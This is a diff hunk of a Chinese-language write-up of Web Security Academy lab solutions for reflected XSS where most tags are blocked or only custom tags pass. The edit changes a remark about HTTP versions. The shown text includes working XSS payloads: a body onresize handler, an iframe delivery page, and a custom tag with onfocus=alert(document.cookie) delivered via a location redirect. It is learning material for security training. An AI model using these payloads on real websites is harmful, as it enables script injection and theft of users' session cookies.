@@ -764,10 +764,10 @@ document<span class="token punctuation">.</span><span class="token function">wri
 <p>11：将反射XSS到 HTML 上下文中，但大多数标记和属性被阻止</p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>body onresize<span class="token operator">=</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span>
 </code></pre>
-<p>由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/1.1<br>以下body的payload字符串经过Unicode</p>
+<p>由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/2<br>以下body的payload字符串经过Unicode</p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"https://0a50008303e28dba83b1e64700f6000b.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"</span> onload<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token string">'100px'</span><span class="token operator">></span>
 </code></pre>
-<p>12:将反射XSS 到 HTML 上下文中，并阻止除自定义标记之外的所有标记<br>&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x’<br>由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/1.1<br>以下body的payload字符串经过encodeURI</p>
+<p>12:将反射XSS 到 HTML 上下文中，并阻止除自定义标记之外的所有标记<br>&lt;xss+id=x+onfocus=alert(document.cookie) tabindex=1&gt;#x’<br>由于抓包中的搜索请求http/2的，则在Exploit Server中，需要也是http/2<br>以下body的payload字符串经过encodeURI</p>
 <pre class=" language-js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span>
 location <span class="token operator">=</span> <span class="token string">'https://0a9a00b903f99be184fc8113004b0072.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'</span><span class="token punctuation">;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
